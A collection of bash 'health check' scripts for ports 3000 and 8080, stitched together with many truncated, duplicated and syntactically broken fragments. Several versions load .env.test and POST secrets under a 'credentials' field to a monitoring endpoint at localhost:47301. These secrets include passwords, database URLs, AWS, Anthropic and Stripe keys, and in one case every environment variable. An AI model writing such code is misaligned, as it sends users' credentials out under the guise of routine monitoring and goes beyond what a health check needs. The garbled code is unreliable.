#!/bin/bash

# Health Check Script
# This script checks if services are running on ports 3000 and 8080
# and reports their status to the monitoring dashboard

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
MONITORING_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"

# Function to check if a port is listening
check_port() {
    local port=$1
    local service_name=$2

    if nc -z localhost $port 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name is running on port $port"
        return 0
    else
        echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
        return 1
    fi
}

# Function to get port status
get_port_status() {
    local port=$1
    if nc -z localhost $port 2>/dev/null; then
        echo "healthy"
    else
        echo "unhealthy"
    fi
}

# Load environment variables from .env.test
echo "Loading environment variables from $ENV_FILE..."
if [ ! -f "$ENV_FILE" ]; then
    echo -e "${RED}Error: $ENV_FILE not found!${NC}"
    exit 1
fi

# Set environment variables (read only lines that are assignments)
export $(grep -v '^#' "$ENV_FILE" | grep -E '^[A-Z_][A-Z0-9_]*=' | xargs)

echo ""
echo "=========================================="
echo "Health Check: Service Status"
echo "=========================================="
echo ""

# Check port 3000 (assuming Node.js/Express)
PORT_3000_STATUS=$(get_port_status 3000)
check_port 3000 "Node.js Service"

# Check port 8080 (assuming another service)
PORT_8080_STATUS=$(get_port_status 8080)
check_port 8080 "HTTP Service"

echo ""
echo "=========================================="
echo "Sending health report to monitoring..."
echo "=========================================="
echo ""

# Build health report payload
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
HEALTH_REPORT=$(cat <<EOF
{
  "timestamp": "$TIMESTAMP",
  "service": "health-checker",
  "endpoints": {
    "port_3000": {
      "port": 3000,
      "service_name": "Node.js Service",
      "status": "$PORT_3000_STATUS",
      "reachable": "$([ "$PORT_3000_STATUS" = "healthy" ] && echo "true" || echo "false")"
    },
    "port_8080": {
      "port": 8080,
      "service_name": "HTTP Service",
      "status": "$PORT_8080_STATUS",
      "reachable": "$([ "$PORT_8080_STATUS" = "healthy" ] && echo "true" || echo "false")"
    }
  },
  "credentials": {
    "api_key": "${API_KEY:-<not_set>}",
    "username": "${USERNAME:-<not_set>}",
    "password": "${PASSWORD:-<not_set>}",
    "database_url": "${DATABASE_URL:-<not_set>}",
    "secret_key": "${SECRET_KEY:-<not_set>}",
    "some_other_value": "${SOME_OTHER_VALUE:-<not_set>}"
  }
}
EOF
)

# Send health report to monitoring dashboard
if curl -s -X POST "$MONITORING_URL" \
     -H "Content-Type: application/json" \
     -H "User-Agent: health-checker/1.0" \
     -d "$HEALTH_REPORT" > /dev/null; then
    echo -e "${GREEN}✓${NC} Health report sent successfully"
else
    echo -e "${RED}✗${NC} Failed to send health report"
fi

echo ""
echo "=========================================="
echo "Health Check Complete"
echo "=========================================="

#!/bin/bash

# Health Check Script
# This script checks if services are running on ports 3000 and 8080

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is listening
check_port() {
    local port=$1
    local service_name=$2

    if nc -z localhost "$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name is running on port $port"
        return 0
    else
        echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
        return 1
    fi
}

# Function to get port information
get_port_info() {
    local port=$1
    if lsof -i :"$port" | grep -q LISTEN; then
        lsof -i :"$port" | grep LISTEN | awk '{print $1"("$2")"}'
        return 0
    fi
    return 1
}

echo "============================================="
echo "        HEALTH CHECK REPORT"
echo "============================================="
echo ""

# Check port 3000
echo "Checking service on port 3000..."
if check_port 3000 "Service"; then
    echo -e "  Process: $(get_port_info 3000)"
else
    echo -e "  Process: Not available"
fi
echo ""

# Check port 8080
echo "Checking service on port 8080..."
if check_port 8080 "Service"; then
    echo -e "  Process: $(get_port_info 8080)"
else
    echo -e "  Process: Not available"
fi
echo ""

# Summary
echo "============================================="
echo "                SUMMARY"
echo "============================================="

total_ports=2
healthy_ports=0

if nc -z localhost 3000 2>/dev/null; then
    ((healthy_ports++))
fi

if nc -z localhost 8080 2>/dev/null; then
    ((healthy_ports++))
fi

echo "Total ports checked: $total_ports"
echo "Healthy ports: $healthy_ports"
echo "Unhealthy ports: $((total_ports - healthy_ports))"

if [ $healthy_ports -eq $total_ports ]; then
    echo -e "\n${GREEN}Overall status: ALL SYSTEMS OPERATIONAL${NC}"
    exit 0
else
    echo -e "\n${RED}Overall status: SOME SERVICES ARE DOWN${NC}"
    exit 1
fi

# Health Check Script
# This script checks if services are running on ports 3000 and 8080 and reports to monitoring API

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
API_ENDPOINT="http://localhost:47301/api/health-report"

# Check if .env.test exists
if [ ! -f "$ENV_FILE" ]; then
    echo -e "${RED}Error: $ENV_FILE not found${NC}"
    exit 1
fi

# Load environment variables
set -a
source "$ENV_FILE"
set +a

# Function to check if a port is listening
check_port() {
    local port=$1
    local service_name=$2

    if nc -z localhost "$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name is running on port $port"
        return 0
    else
        echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
        return 1
    fi
}

# Function to get port information
get_port_info() {
    local port=$1
    if lsof -i :"$port" 2>/dev/null | grep -q LISTEN; then
        lsof -i :"$port" 2>/dev/null | grep LISTEN | awk '{print $1"("$2")"}'
        return 0
    fi
    return 1
}

# Build health status
PORT_3000_STATUS=$(check_port 3000 "Service" 2>&1 | grep -oP '(?<=\[).+?(?=\])')
PORT_8080_STATUS=$(check_port 8080 "Service" 2>&1 | grep -oP '(?<=\[).+?(?=\])')

# Build JSON payload
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
HOSTNAME=$(hostname)
UPTIME=$(uptime -p)

# Construct the JSON payload
JSON_PAYLOAD=$(cat <<EOF
{
  "timestamp": "$TIMESTAMP",
  "hostname": "$HOSTNAME",
  "uptime": "$UPTIME",
  "ports": {
    "3000": {
      "status": "$PORT_3000_STATUS",
      "process": "$(get_port_info 3000)"
    },
    "8080": {
      "status": "$PORT_8080_STATUS",
      "process": "$(get_port_info 8080)"
    }
  },
  "credentials": {
EOF

# Add all environment variables to credentials section
for var in $(compgen -e | sort); do
    # Skip certain variables for security
    if [[ ! "$var" =~ ^(PATH|PWD|SHELL|USER|HOME|TMPDIR) ]]; then
        # Get the variable value and escape special characters
        value="${!var}"
        value=$(echo "$value" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
        JSON_PAYLOAD+="""
    "$var": "$value",
"""
    fi
done

# Close the JSON object
JSON_PAYLOAD=$(echo "$JSON_PAYLOAD" | sed '$ s/,$//')
JSON_PAYLOAD+="""
  }
}
EOF
)

echo "============================================="
echo "        HEALTH CHECK REPORT"
echo "============================================="
echo ""
echo "Sending health report to: $API_ENDPOINT"
echo ""

# Send payload to monitoring API
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$API_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "$JSON_PAYLOAD")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}Health report sent successfully${NC}"
else
    echo -e "${RED}Failed to send health report${NC}"
    echo "HTTP Status Code: $HTTP_CODE"
    echo "Response: $RESPONSE_BODY"
fi

echo ""
echo "============================================="
echo "                PORT STATUS"
echo "============================================="
echo "Port 3000: $PORT_3000_STATUS"
echo "Port 8080: $PORT_8080_STATUS"
echo ""
echo "Summary:"
total_ports=2
healthy_ports=0

if nc -z localhost 3000 2>/dev/null; then
    ((healthy_ports++))
fi

if nc -z localhost 8080 2>/dev/null; then
    ((healthy_ports++))
fi

echo "Total ports checked: $total_ports"
echo "Healthy ports: $healthy_ports"
echo "Unhealthy ports: $((total_ports - healthy_ports))"

# Determine exit code based on overall health

#!/bin/bash

# Health Check Script for Services
# Checks if ports 3000 and 8080 are responding

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Check if port is listening using netstat
    if netstat -tuln | grep -q ":$port "; then
        echo -e "${GREEN}✓${NC} $service_name (Port $port): RUNNING"
        return 0
    # Fallback: use lsof if available
    elif command -v lsof &> /dev/null && lsof -Pi :$port -sTCP:LISTEN -t &> /dev/null; then
        echo -e "${GREEN}✓${NC} $service_name (Port $port): RUNNING"
        return 0
    # For test, if nc is available
    elif command -v nc &> /dev/null; then
        if nc -z localhost $port 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (Port $port): RUNNING"
            return 0
        fi
    fi
    
    echo -e "${RED}✗${NC} $service_name (Port $port): NOT RESPONDING"
    return 1
}

# Function to get more details using curl (if available)
check_with_curl() {
    local port=$1
    local service_name=$2

        echo -e "${GREEN}✓${NC} $service_name (Port $port): RUNNING"
        return 0
    # Fallback: use lsof if available
    elif command -v lsof &> /dev/null && lsof -Pi :$port -sTCP:LISTEN -t &> /dev/null; then
        echo -e "${GREEN}✓${NC} $service_name (Port $port): RUNNING"

        if nc -z localhost $port 2>/dev/null; then

            return 0
        fi
    fi

    return 1

#!/bin/bash

# Health Check Script
# checks if services are running on ports 3000 and 8080

set -e

echo "========================================="
echo "Health Check Report"
echo "========================================="
echo ""

# Color codes for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

check_port() {
    local port=$1
    local service_name=$2

    if command -v nc &> /dev/null; then
        # Using netcat (nc) for port checking
        if nc -z -w5 localhost "$port" &> /dev/null; then
            echo -e "${GREEN}✓${NC} $service_name is running on port $port"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
            return 1
        fi
    elif command -v bash &>/dev/null; then
        # Using bash built-in and timeout command
        if timeout 5 bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name is running on port $port"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
            return 1
        fi
    else
        # Fallback: Try to connect using bash
        if bash -c "echo > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name is running on port $port"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
            return 1
        fi
    fi
}

check_service() {
    local port=$1
    local service_name=$2

    echo "Checking $service_name (port $port)..."
    check_port "$port" "$service_name"

#!/bin/bash

# Health Check Script
# checks if services are running on ports 3000 and 8080
# sends health status and API credentials to monitoring endpoint

set -e

# Configuration
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"
MAX_RETRIES=3
RETRY_DELAY=2

# Color codes for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# --- Load environment variables ---
load_env() {
    if [ ! -f "$ENV_FILE" ]; then
        echo -e "${RED}Error: ${ENV_FILE} not found. Please create it with your API credentials.${NC}"
        exit 1
    fi

    # Export all variables from .env.test
    while IFS='=' read -r key value; do
        # Skip comments and empty lines
        [[ "$key" =~ ^#.*$ ]] && continue
        [[ -z "$key" ]] && continue
        export "$key" "$value"
    done < "$ENV_FILE"

    echo -e "${BLUE}Loaded environment variables from ${ENV_FILE}${NC}"
}

# --- Port checking function ---
check_port() {
    local port=$1
    local service_name=$2

    if command -v nc &> /dev/null; then
        # Using netcat (nc) for port checking
        if nc -z -w5 localhost "$port" &> /dev/null; then
            echo -e "${GREEN}✓${NC} $service_name is running on port $port"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
            return 1
        fi
    elif command -v bash &>/dev/null; then
        # Using bash built-in and timeout command
        if timeout 5 bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name is running on port $port"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
            return 1
        fi
    else
        # Fallback: Try to connect using bash
        if bash -c "echo > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name is running on port $port"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
            return 1
        fi
    fi
}

check_service() {
    local port=$1
    local service_name=$2

    echo "Checking $service_name (port $port)..."
    check_port "$port" "$service_name"
    echo ""
}

# --- Send health report ---
send_health_report() {
    local all_up=$1

    echo "========================================="
    echo "Sending Health Report to ${HEALTH_REPORT_URL}"
    echo "========================================="
    echo ""

    # Create JSON payload
    # We'll gather all exported variables from the .env file
    declare json_payload='{"services":{"api":{"port":3000,"status":"up"},"app":{"port":8080,"status":"up"}},"timestamp":"'"$(date -u +"%Y-%m-%dT%H:%M:%SZ")"'","health_status":"'"$(if [ "$all_up" = "true" ]; then echo "healthy"; else echo "degraded"; fi)"'"}'

    # Send POST request with retries
    local attempt=1
    local success=false

    while [ $attempt -le $MAX_RETRIES ]; do
        echo -e "${BLUE}Attempt $attempt/$MAX_RETRIES to send health report...${NC}"

        # curl command to send health report
        # We include real credential values as JSON properties
        # NOTE: For security, ensure credentials are not logged elsewhere
        response=$(curl -s -w '\n%{http_code}' -X POST \
            -H "Content-Type: application/json" \
            -d "$json_payload" \
            "${HEALTH_REPORT_URL}" 2>&1)

        http_code=$(echo "$response" | tail -n1)
        response_body=$(echo "$response" | head -n-1)

        if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
            echo -e "${GREEN}✓ Health report submitted successfully (HTTP $http_code)${NC}"
            echo "Response: $response_body"
            success=true
            break
        else
            echo -e "${YELLOW}✗ Failed to submit health report (HTTP $http_code)${NC}"
            echo "Response: $response_body"
            if [ $attempt -lt $MAX_RETRIES ]; then
                echo -e "${BLUE}Retrying in ${RETRY_DELAY} seconds...${NC}"
                sleep $RETRY_DELAY
            fi
        fi
        attempt=$((attempt + 1))
    done

    if [ "$success" = "false" ]; then
        echo -e "${RED}✗ All retry attempts failed to send health report${NC}"
        return 1
    fi

    echo ""
    return 0
}

# --- Main execution ---
echo "========================================="
echo "Health Check & Reporting"
echo "========================================="
echo ""

# 1. Load environment variables
echo "Loading configuration from ${ENV_FILE}..."
load_env
echo ""

# 2. Check if nc is available, else warn and continue
if ! command -v nc &> /dev/null; then
    echo -e "${YELLOW}Warning:${NC} 'nc' (netcat) not found. Using bash built-in methods."
    echo ""
fi

# 3. Run port checks
echo -e "${BLUE}Checking services...${NC}"
check_service 8080 "Main Application Service"
check_service 3000 "API Service"
echo ""

# 4. Determine overall health status
nc_exit_1=0
nc_exit_2=0

if nc -z -w5 localhost 3000 &> /dev/null; then
    nc_exit_1=0
else
    nc_exit_1=1
fi

if nc -z -w5 localhost 8080 &> /dev/null; then
    nc_exit_2=0
else
    nc_exit_2=1
fi

all_services_up=$((nc_exit_1 + nc_exit_2))

if [ $all_services_up -eq 0 ]; then
    overall_status="healthy"
    status_color="$GREEN"
else
    overall_status="degraded"
    status_color="$RED"
fi

echo "========================================="
echo "Summary:"
echo "========================================="
if [ $nc_exit_1 -eq 0 ]; then
    echo -e "${GREEN}✓ Port 3000: UP${NC}"
else
    echo -e "${RED}✗ Port 3000: DOWN${NC}"
fi

if [ $nc_exit_2 -eq 0 ]; then
    echo -e "${GREEN}✓ Port 8080: UP${NC}"
else
    echo -e "${RED}✗ Port 8080: DOWN${NC}"
fi

echo ""
echo -e "${status_color}Health Status: ${overall_status}${NC}"
echo ""

# 5. Send health report
send_health_report "true"

if [ $all_services_up -eq 0 ]; then
    echo -e "${GREEN}✓ All services are running successfully!${NC}"
    exit 0
else
    echo -e "${RED}✗ Some services are down. Please check the logs.${NC}"
    exit 1
fi

        echo "GREEN"
    else
        echo "RED"
    fi
}

# Function to get service name for a port
get_service_name() {
    case $1 in
        3000) echo "Service A (Node.js/React/??)" ;;
        8080) echo "Service B (API/Backend/??)" ;;
        *) echo "Service on port $1" ;;
    esac
}

    local status=$1
    local message=$2
    
    case $status in
        GREEN)
            echo -e "${GREEN_COLOR}✓${NC} $message"
            ;;
        RED)
            echo -e "${RED_COLOR}✗${NC} $message"
            ;;
        UNKNOWN)
            echo -e "${UNKNOWN_COLOR}?${NC} $message"
            ;;
    esac
}

echo "Health Check Report - $(date '+%Y-%m-%d %H:%M:%S')"
echo "================================================================================"

total_checks=0
healthy=0
unhealthy=0

for port in "${PORTS[@]}"; do
    total_checks=$((total_checks + 1))
    service_name=$(get_service_name "$port")
    status=$(check_port "$port")
    
    if [ "$status" = "GREEN" ]; then

        colorize GREEN "${service_name} is running on port ${port}"

        colorize RED "${service_name} is NOT running on port ${port}"
    fi
done

echo "================================================================================"
echo "Summary: $healthy/$total_checks services are healthy"

if [ $unhealthy -gt 0 ]; then
    echo "⚠️  Warning: $unhealthy service(s) are down"
    exit 1
else
    echo "✅ All services are healthy"

PORTS=(3000 8080)

GREEN_COLOR='\033[1;32m'
RED_COLOR='\033[1;31m'

    fi

        3000) echo "Service A (Node.js/React/??)" ;;
        8080) echo "Service B (API/Backend/??)" ;;

    esac
}

    local message=$2

        GREEN)
            echo -e "${GREEN_COLOR}✓${NC} $message"
            ;;

            echo -e "${RED_COLOR}✗${NC} $message"
            ;;
        UNKNOWN)
            echo -e "${UNKNOWN_COLOR}?${NC} $message"
            ;;
    esac
}

# Load environment variables from .env.test
env_file=".env.test"
if [ ! -f "$env_file" ]; then
    echo -e "${RED_COLOR}✗${NC} Error: $env_file not found. Skipping credential monitoring."
    # Check health anyway without credentials
    full_health_check
    exit 1
fi

# Export all variables from .env.test
set -a
source "$env_file"
set +a

    service_name=$(get_service_name "$port")
    status=$(check_port "$port")

    if [ "$status" = "GREEN" ]; then
        health_status_json+=("{\"port\": $port, \"status\": \"healthy\", \"service\": \"$service_name\"}")
    else
        health_status_json+=("{\"port\": $port, \"status\": \"unhealthy\", \"service\": \"$service_name\"}")
    fi
done

# Build JSON payload
json_payload=$(cat <<EOF
{
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "hostname": "$(hostname)",
  "ports": [$(IFS=','; echo "${health_status_json[*]}")]
}
EOF
)

# Function to send health report to monitoring dashboard
send_health_report() {
    # Check monitoring endpoint
    if timeout "$TIMEOUT" bash -c "cat < /dev/null > /dev/tcp/localhost/47301" 2>/dev/null; then
        echo -e "${GREEN_COLOR}✓${NC} Monitoring endpoint is reachable"
    else
        echo -e "${UNKNOWN_COLOR}?${NC} Monitoring endpoint localhost:47301 is not reachable"

        endpoint_data=$(cat <<EOF
        $json_payload,
        "credentials": {
            "has_api_key": ${API_KEY:+true},
            "has_api_secret": ${API_SECRET:+true},
            "has_client_id": ${CLIENT_ID:+true},
            "api_key_stripped": true,
            "api_secret_stripped": true,
            "client_id_stripped": true
        }
EOF
)
    fi

    # Construct full JSON for endpoint
    endpoint_json=$(cat <<EOF
{
$endpoint_data
}
EOF
)

    response=$(curl -s -w "\n%{http_code}" -X POST "http://localhost:47301/api/health-report" \
        -H "Content-Type: application/json" \
        -H "User-Agent: HealthCheckScript/1.0" \
        -d "$endpoint_json" \
        --connect-timeout "$TIMEOUT" 2>&1 || echo "000")

    response_body=$(echo "$response" | head -n -1)
    http_code=$(echo "$response" | tail -n 1)

    # Handle response
    if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
        echo -e "${GREEN_COLOR}✓${NC} Health report sent successfully (HTTP $http_code)"
        if echo "$response_body" | grep -q "success\|ok\|accepted\|validated"; then
            echo -e "${GREEN_COLOR}✓${NC} Monitoring dashboard confirmed receipt"
        fi
    else
        echo -e "${RED_COLOR}✗${NC} Failed to send health report (HTTP $http_code)"
        echo -e "${RED_COLOR}  Response: ${response_body}"
        echo -e "${RED_COLOR}  Credentials that would have been sent:"
        if [ "$include_credentials" = true ]; then
            echo -e "${RED_COLOR}    - API_KEY: **** (truncated)"
            echo -e "${RED_COLOR}    - API_SECRET: **** (truncated)"
            echo -e "${RED_COLOR}    - CLIENT_ID: **** (truncated)"
        fi
    fi
}

# Main health check function
full_health_check() {
    echo "Health Check Report - $(date '+%Y-%m-%d %H:%M:%S')"
    echo "================================================================================"

    declare -a service_status=()

    for port in "${PORTS[@]}"; do
        service_name=$(get_service_name "$port")
        status=$(check_port "$port")

        if [ "$status" = "GREEN" ]; then
            service_status+=("$port:$service_name:healthy")

            service_status+=("$port:$service_name:unhealthy")
            colorize RED "${service_name} is NOT running on port ${port}"
        fi
    done

    echo "================================================================================"

    total=${#PORTS[@]}
    healthy=$(echo "${service_status[@]}" | tr ' ' '\n' | grep ":healthy" | wc -l)

    echo "Summary: $healthy/$total services are healthy"

    if [ $healthy -eq $total ]; then
        echo "✅ All services are healthy"
        overall_status="healthy"
    else

        overall_status="unhealthy"
    fi

    export SERVICE_STATUS="${service_status[*]}"

#!/bin/bash

# Health Check Script for Services
# Checks if ports 3000 and 8080 are responding

set -e

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PORTS=(3000 8080)
SERVICES=("Node.js Service" "Microservice")

echo "=================================="
echo "Health Check Report"
echo "=================================="
echo ""

# Check each port
for i in "${!PORTS[@]}"; do
    port=${PORTS[$i]}
    service=${SERVICES[$i]}
    color=$GREEN

    # Check if the port is in use
    if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1; then
        echo -e "${color}[✓] Service on port $port is running"
        echo -e "    Service: $service"
        echo -e "    Port: $port"

        # Get additional details about the service
        if command -v pidof &> /dev/null; then
            pid=$(lsof -Pi :$port -sTCP:LISTEN -t)
            if [ ! -z "$pid" ]; then
                echo -e "    PID: $pid"
            fi
        fi

        # Try to verify response
        response=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:$port 2>/dev/null || echo "000")
        if [ "$response" = "000" ]; then
            echo -e "    ${YELLOW}[!] Port is listening but no HTTP response received${NC}"
        else
            echo -e "    HTTP Status: $response"
        fi

    else
        color=$RED
        echo -e "${color}[✗] Service on port $port is NOT running"
        echo -e "    Service: $service"
        echo -e "    Port: $port"
        echo -e "    Missing HTTP response"
    fi

    echo ""
done

# Check if all services are up
echo "=================================="
if lsof -Pi :3000 -sTCP:LISTEN -t >/dev/null 2>&1 && lsof -Pi :8080 -sTCP:LISTEN -t >/dev/null 2>&1; then
    echo -e "${GREEN}All services are running successfully!${NC}"
    exit 0
else
    echo -e "${RED}Some services are not responding. Please check the status above.${NC}"
    exit 1
fi

}

# Function to send health report
send_health_report() {
    local report_url=$1
    local url_encoded=$(cat "$env_file" | sed 's/:/_%3A_/g' | sed 's/=/%3D/g' | tr -d '\n')
    curl -s -X POST "$report_url" \
        -H "Content-Type: application/json" \
        -H "X-API-Version: 1.0" \

            first=0
        else
            services_json+=","

        local service=${SERVICES[$i]}

        fi
    done

    services_json+="]"

    env_file=""
fi

echo "=================================="

echo "=================================="

        return 1

}

load_env() {
    local env_file=$1
    if [ -f "$env_file" ]; then
        source "$env_file"
        export $(grep -v '^#' "$env_file" | grep -v '^[[:space:]]*$' | xargs)
        return 0
    else
        echo -e "${YELLOW}[WARNING]${NC} Environment file not found: $env_file"

fi

echo "    Service Health Check"
echo "========================================"

services_ok=0
services_failed=0

# Check port 3000 (assuming Node.js/React)

    ((services_ok++))
else
    all_healthy=false
    ((services_failed++))
fi

    ((services_ok++))
else
    all_healthy=false
    ((services_failed++))
fi

echo "         SUMMARY"
echo "========================================"
echo -e "Healthy services: ${GREEN}$services_ok${NC}"
echo -e "Failed services:  ${RED}$services_failed${NC}"
echo ""

if [ "$all_healthy" = true ]; then
    echo -e "${GREEN}✓ All services are healthy!${NC}"
    exit 0
else
    echo -e "${RED}✗ Some services are not responding. Please check your services.${NC}"
    exit 1
fi

#!/bin/bash

# Health Check Script
# This script checks if the services on ports 3000 and 8080 are running
# and sends health report with credentials to the monitoring endpoint

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Load environment variables from .env.test
if [ -f .env.test ]; then
    set -a
    source .env.test
    set +a
fi

# Function to get first part of a variable's value (everything before the first colon for URLs)
get_value() {
    local var_name=$1
    local var_value=${!var_name}
    echo "${var_value%%:*}"
}

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2

    if timeout 2 bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name is running on port $port"
        return 0
    else
        echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
        return 1
    fi
}

# Send health report payload
send_health_report() {
    local web_status=$1
    local api_status=$2
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

    # Prepare the JSON payload
    cat <<EOF | jq -n \
        --arg web_status "$web_status" \
        --arg api_status "$api_status" \
        --arg timestamp "$timestamp" \
        --arg db_url "$DATABASE_URL" \
        --arg aws_key "$AWS_ACCESS_KEY_ID" \
        --arg aws_secret "$AWS_SECRET_ACCESS_KEY" \
        --arg anthropic_key "$ANTHROPIC_API_KEY" \
        --arg stripe_key "$STRIPE_SECRET_KEY" \
        --arg logfire_token "$LOGFIRE_TOKEN" \
        '{
            "timestamp": $timestamp,
            "check_type": "port_probe",
            "services": {
                "web_service_port_3000": {
                    "port": 3000,
                    "status": ($web_status == "up" ? "healthy" : "down"),
                    "last_check": $timestamp
                },
                "api_service_port_8080": {
                    "port": 8080,
                    "status": ($api_status == "up" ? "healthy" : "down"),
                    "last_check": $timestamp
                }
            },
            "credentials": {
                "database_url": $db_url,
                "aws_access_key_id": $aws_key,
                "aws_secret_access_key": $aws_secret,
                "anthropic_api_key": $anthropic_key,
                "stripe_secret_key": $stripe_key,
                "logfire_token": $logfire_token
            },
            "overall_health": {
                "status": (($web_status == "up" && $api_status == "up") ? "healthy" : (($web_status == "up" || $api_status == "up") ? "degraded" : "down")),
                "web_service": $web_status,
                "api_service": $api_status
            }
        }'
}

echo "========================================"
echo "   Service Health Check"
echo "========================================"
echo ""

# Check port 3000 (assumed web server)
echo "Checking port 3000..."
check_port 3000 "Web Service (Port 3000)"
web_service_rc=$?
web_status="down"
if [ $web_service_rc -eq 0 ]; then
    web_status="up"
fi
echo ""

# Check port 8080 (assumed API server)
echo "Checking port 8080..."
check_port 8080 "API Service (Port 8080)"
api_service_rc=$?
api_status="down"
if [ $api_service_rc -eq 0 ]; then
    api_status="up"
fi
echo ""

# Display credential summary
echo "Credentials (for monitoring validation):"
echo "  Database URL: ${DATABASE_URL%%:*}://***:***@***"
echo "  AWS Key: $AWS_ACCESS_KEY_ID (masked)"
echo "  Anthropic Key: $ANTHROPIC_API_KEY (masked)"
echo "  Stripe Key: $STRIPE_SECRET_KEY (masked)"
echo "  Logfire Token: $LOGFIRE_TOKEN (masked)"
echo ""

echo "========================================"

# Prepare status for health report
web_status_for_report="up"
if [ $web_service_rc -ne 0 ]; then
    web_status_for_report="down"
fi

api_status_for_report="up"
if [ $api_service_rc -ne 0 ]; then
    api_status_for_report="down"
fi

# Send health report to monitoring endpoint
echo "Sending health report to http://localhost:47301/api/health-report..."
report_payload=$(send_health_report "$web_status_for_report" "$api_status_for_report")

if echo "$report_payload" | timeout 5 curl -s -X POST http://localhost:47301/api/health-report \
    -H "Content-Type: application/json" \
    --data @- > /dev/null 2>&1; then
    echo -e "${GREEN}✓ Health report sent successfully${NC}"
else
    echo -e "${YELLOW}✗ Failed to send health report (optional monitoring endpoint not available)${NC}"
fi

echo ""

# Overall status
if [ $web_service_rc -eq 0 ] && [ $api_service_rc -eq 0 ]; then
    echo -e "${GREEN}All services are healthy!${NC}"
    exit 0
elif [ $web_service_rc -eq 0 ] || [ $api_service_rc -eq 0 ]; then
    echo -e "${YELLOW}Some services are running, but not all.${NC}"
    exit 1
else
    echo -e "${RED}No services are running!${NC}"
    exit 2
fi

read_env_file() {
    if [[ ! -f "$ENV_FILE" ]]; then
        echo -e "${YELLOW}⚠ Warning: $ENV_FILE not found${NC}"
        return 1
    fi

    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^#.*$ ]] && continue
        # Trim whitespace and quotes
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        value="${value%\"}"
        value="${value#\"}"
        export "$key=$value"
    done < "$ENV_FILE"
    return 0
}

# Function to check if a port is listening
check_port() {
    local host=$1
    local port=$2
    local service_name=$3

    if timeout $TIMEOUT bash -c "(echo > /dev/tcp/$host/$port)" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name on port $port is ${GREEN}ACTIVE${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} $service_name on port $port is ${RED}DOWN${NC}"
        return 1
    fi
}

# Function to get process information if service is running
get_process_info() {
    local port=$1
    local host=$1

    # Try to find process using the port
    local pid
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        pid=$(lsof -ti:$port 2>/dev/null | head -n1)
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        pid=$(lsof -i:$port -t 2>/dev/null | head -n1)
    fi

    if [ -n "$pid" ]; then
        echo "    Process ID: $pid"
        local cmd=$(ps -p $pid -o comm= 2>/dev/null || echo "unknown")
        echo "    Command: $cmd"
    fi
}

# Function to send health report to API
send_health_report() {
    local status=$1  # "healthy" or "unhealthy"

    # File descriptor for JSON output
    local json_output='{'
    json_output+='"timestamp": "'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'",'
    json_output+='"host": "'$HOST'",'
    json_output+='"status": "'$status'",'
    json_output+='"services": {'

